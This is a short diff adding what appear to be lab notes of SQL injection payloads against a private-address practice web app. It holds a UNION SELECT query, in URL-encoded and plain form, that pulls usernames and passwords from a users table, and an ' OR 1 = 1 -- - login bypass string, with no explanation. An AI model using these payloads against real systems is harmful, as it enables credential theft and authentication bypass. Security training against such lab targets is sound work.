@@ -1,0 +1,9 @@
+===== SQL_injection.php =======
+
+http://10.0.2.21/example/sql_injection.php?name=Paul%22%20UNION%20SELECT%20username,%20password%20FROM%20users%20--%20-
+
+http://10.0.2.21/example/sql_injection.php?name=Paul" UNION SELECT username, password FROM users -- -
+
+
+====== Login.php ========
+ ' OR 1 = 1 -- -
